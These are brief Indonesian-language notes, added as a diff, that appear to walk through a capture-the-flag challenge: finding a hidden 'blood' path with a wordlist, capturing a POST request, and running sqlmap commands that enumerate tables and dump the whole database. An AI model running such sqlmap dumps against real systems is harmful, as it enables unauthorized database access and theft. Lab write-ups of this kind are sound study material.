@@ -1,0 +1,11 @@
+1. final :
+- masuk ip gada apa apa, cek wordlist di wu orang, blood sesuai nama di soal soal disitu
+- masukin wordlist aja blood, cek situ, coba search terus cek network
+- ada tuh post data, copy as curl
+- nanti ke curl converter, convert ke http
+- jadiin file dulu
+- sqlmap -r data --dbs --random-agent
+- next -D in --tables terus -T in --columns ato langsung aja
+- sqlmap -r data -D blood --dump --random-agent --current-user | tee sqlmap.txt
+- sqlmap -r data -D blood -a juga bisa
+- cek aja 
